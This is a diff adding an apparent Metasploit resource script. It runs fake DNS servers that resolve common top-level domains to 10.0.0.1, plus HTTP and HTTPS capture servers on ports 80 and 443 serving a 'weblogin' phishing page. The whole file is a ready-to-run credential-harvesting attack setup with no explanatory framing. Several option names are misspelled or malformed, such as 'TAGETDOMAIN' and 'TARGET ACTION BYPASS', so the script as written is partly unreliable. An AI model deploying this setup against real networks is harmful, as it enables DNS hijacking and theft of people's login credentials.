@@ -1,0 +1,30 @@
+use auxiliary/server/fakedns
+set LogConsole true
+set TARGETHOST 10.0.0.1
+set SRVHOST 10.0.0.1
+set TAGETDOMAIN *.com, *.org, *.it, *.net, *.edu. *.fr
+set TARGET ACTION BYPASS
+set SRVPORT 5353
+run -j
+
+use auxiliary/server/fakedns
+set LogConsole true
+set TARGETHOST 10.0.0.1
+set SRVHOST 10.0.0.1
+set TAGETDOMAIN *.com, *.org, *.it, *.net, *.edu, *.fr
+set TARGET ACTION BYPASS
+set SRVPORT 53
+run -j
+
+use auxiliary/server/capture/http
+set SRVHOST 10.0.0.1
+set TEMPLATE weblogin/index.html
+set SRVPORT 80
+run -j
+
+use auxiliary/server/capture/http
+set SRVHOST 10.0.0.1
+set TEMPLATE weblogin/index.html
+set SRVPORT 443
+set SSL true
+run -j
